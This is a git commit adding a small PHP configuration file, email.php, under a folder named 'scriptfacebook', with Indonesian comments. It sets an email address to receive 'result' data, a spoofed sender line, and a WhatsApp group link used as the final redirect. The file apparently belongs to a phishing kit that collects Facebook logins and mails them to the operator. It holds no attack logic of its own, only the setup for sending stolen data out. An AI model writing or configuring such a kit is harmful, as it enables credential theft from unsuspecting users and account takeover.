33f42911f4600769e40dd0c911dbc6a9db25af7c
abeganas <69162702+abeganas@users.noreply.github.com>
2020-10-09 23:59:23 +0700

    Add files via upload

---
+++ scriptfacebook/email.php
@@ -0,0 +1,9 @@
+<?php
+
+$mailto = 'nurdingans69@gmail.com'; // email tujuan result
+
+$from = 'From: ━╤デ╦︻ <result@ngtd.com>'; // nama result, kalo mau di ubah cuma tembak nya aja yg di ubah!
+
+$link_grup = 'https://chat.whatsapp.com/FuokRRYFpwU7AO2EPrUSFQ'; // link tujuan, grup whatsapp asli
+
+?>
